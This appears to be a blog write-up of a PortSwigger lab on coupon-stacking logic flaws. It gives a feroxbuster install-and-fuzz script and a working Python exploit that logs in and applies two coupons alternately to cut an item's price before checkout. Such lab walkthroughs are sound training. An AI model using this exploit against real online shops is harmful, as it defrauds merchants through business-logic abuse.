--- 
title: "Flawed Enforcement of Business Rule"
author: ""
date: 2024-06-01T17:57:16+01:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
#### Entities
Asset: https://0a3900c2044cf17781f1123e00480036.web-security-academy.net

#### Enumeration
Access the lab, add the domain to Burp's Target scope and check `Include subdomains`. View `/` route source page and inspect the page, then request all embedded links via Burp proxy using the scripts below.

```python
import os
import platform
import subprocess
import sys

def check_binary(binary_name):
  if sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
    command = ['which', binary_name]
  elif sys.platform.startswith('win'):
    command = ['where', binary_name]
  else:
    print("Unsupported operating system")
    return

  try:
    subprocess.check_output(command)
    return True
  except subprocess.CalledProcessError:
    print(f"{binary_name} is not installed.")
    return False

def install_binary(binary_url, binary_name):
  os_name = platform.system().lower()
  binary_file = f"{binary_name}.zip" if os_name == 'windows' else f"{binary_name}.tar.gz"
  
  # Check if binary exists
  if not check_binary(binary_name):
    # Download Binary File if not exist
    if not os.path.exists(binary_file):
      if os_name == 'linux':
        download_command = f"curl -L {binary_url}/x86_64-linux-{binary_name}.tar.gz -o {binary_file}"
      elif os_name == 'darwin':
        download_command = f"curl -L {binary_url}/x86_64-macos-{binary_name}.tar.gz -o {binary_file}"
      elif sys.platform.startswith('win'):
        download_command = f"powershell -Command 'Invoke-WebRequest {binary_url}/x86_64-windows-{binary_name}.exe.zip -OutFile {binary_file}'"
      else:
        print("Unsupported operating system")
        return

      try:
        subprocess.run(download_command, shell=True, check=True)
        print(f"{binary_name} downloaded successfully")
      except subprocess.CalledProcessError as e:
        print(f"Failed to download {binary_name}: {e}")

    # Install Binary
    if os.path.exists(binary_file):
      if os_name in ['linux', 'darwin']:
        extract_command = f"sudo tar -C /usr/local/bin/ -xzf {binary_file} {binary_name} && sudo chmod 775 /usr/local/bin/{binary_name}"
      elif sys.platform.startswith('win'):
        extract_command = f"Powershell -Command \"Expand-Archive -Path {binary_file} -DestinationPath . ; Move-Item -Path .\\{binary_name}.exe -Destination 'C:\\Windows\\'\""
      else:
        print("Unsupported operating system")
        return

      try:
        subprocess.run(extract_command, shell=True, check=True)
        print(f"{binary_name} installed successfully")
      except subprocess.CalledProcessError as e:
        print(f"Failed to install {binary_name}: {e}")

      # Clean up downloaded binary file
      try:
        cleanup_command = f"rm {binary_file}" if os_name != 'windows' else f"del {binary_file}"
        subprocess.run(cleanup_command, shell=True, check=True)
        print(f"Cleaned up {binary_file}")
      except subprocess.CalledProcessError as e:
        print(f"Failed to clean up {binary_file}: {e}")
  else:
    print(f"{binary_name} is already installed.")

def enumerate_path(endpoint, wordlist_path):
  print("Enumerating paths...")
  fuzz_command = f"feroxbuster -u {endpoint} -w {wordlist_path} -C 404 --proxy http://127.0.0.1:8080 --insecure --quiet --no-state --auto-tune"
  process = subprocess.Popen(fuzz_command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
  for line in process.stdout:
    print(line.strip())

def main():
  binary_url = "https://github.com/epi052/feroxbuster/releases/download/v2.10.2"
  binary_name = "feroxbuster"
  endpoint = "https://0a3900c2044cf17781f1123e00480036.web-security-academy.net/"
  wordlist_path = "wordlist.txt"
  install_binary(binary_url, binary_name)
  enumerate_path(endpoint, wordlist_path)

if __name__ == "__main__":
  main()
```
The custom word list used for the above enumeration.
```text
accounts
admin
administrator
api
users
products
product
```

![Enumeration](/images/bizlogic4/01-enumerate-flawed-enforcement-of-business-rule.png "Enumeration")  

#### Exploration
Stacking BurpSuite and the Browser with FoxyProxy extension for Burp turned on, explore the application by signing up for the newsletter and save the signup coupon and the new customer coupon. Then perform a user flow for purchasing an item after logging in with the provided user credential  `wiener:peter`.

![Exploration](/images/bizlogic4/02-explore-flawed-enforcement-of-business-rule.png "Exploration") 

#### Exploitation
The `/login` when requested with valid credentials makes a POST request with `csrf`, `username` and `password` parameters. Return to the homepage and attempt purchasing an item with the coupons saved applied. Reapply these coupons in the order previously done and observe that the coupons were successfully applied to the items. Repeat this to reduce the item price to the minimum that you can and place the order to purchase the item. This exploit can be automated with the script below
```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define Variables
base_url = 'https://0a3900c2044cf17781f1123e00480036.web-security-academy.net/'
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Get CSRF Token
def get_csrf_token(session, url):
  response = session.get(url, proxies=proxies, verify=False)
  csrf_token = BeautifulSoup(response.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')
  return csrf_token

def get_coupon_codes(session, url):
  response = session.get(url, proxies=proxies, verify=False)
  soup = BeautifulSoup(response.content, "html.parser")
  csrf_token = get_csrf_token(session, url)
  
  # Sign up for the newsletter
  form_data = {
    "csrf": csrf_token,
    "email": "attacker@evil.sec"  # Replace with your email address
  }
  signup_response = session.post(url + "sign-up", data=form_data)

  # Extract coupon codes from the response
  newcust_coupon = re.search(r'New customers use code at checkout: (\w+)', str(soup)).group(1)
  signup_coupon = re.search(r'(?<=coupon )([A-Z]+[0-9]+)', signup_response.text).group()

  # Return coupon codes as a list
  coupon_codes = [newcust_coupon, signup_coupon]
  return coupon_codes

# Purchase Item
def purchase_item(session, url):
  # Login
  login_url = urljoin(base_url, 'login')
  login_csrf_token = get_csrf_token(session, login_url)
  login_payload = {'username': 'wiener', 'password': 'peter', 'csrf': login_csrf_token}
  login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False)
  if login_response.status_code == 200:
    # Add item
    cart_url = urljoin(base_url, 'cart')
    cart_payload1 = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '1'}
    session.post(cart_url, data=cart_payload1, proxies=proxies, verify=False)

    # Add coupon
    coupon_url = urljoin(base_url, 'cart/coupon')
    coupon_codes = get_coupon_codes(session, url)
    for coupon in coupon_codes * 4:
      coupon_payload = {'csrf': get_csrf_token(session, cart_url), 'coupon': coupon}
      session.post(coupon_url, data=coupon_payload, proxies=proxies, verify=False)
      print(f"Added coupon {coupon}")

    # Checkout
    checkout_url = urljoin(base_url, 'cart/checkout')
    checkout_csrf_token = get_csrf_token(session, cart_url)
    checkout_payload = {'csrf': checkout_csrf_token}
    checkout_response = session.post(checkout_url, data=checkout_payload, proxies=proxies, verify=False)
    if checkout_response.status_code == 200:
      print("Purchase successful!")
    else:
      print("Failed to checkout.")
  else:
    print("Failed to log in.")

def main():
  session = requests.Session()
  purchase_item(session, base_url)

if __name__ == "__main__":
  main()
```
![Exploitation](/images/bizlogic4/03-exploit-flawed-enforcement-of-business-rule.png "Exploitation") 

![Solution](/images/bizlogic4/04-lab-solution.png "Solution")   

#### Resources
- https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules
- https://github.com/knoxknot/portswigger/tree/main/business-logic/04-flawed-enforcement-of-business-rule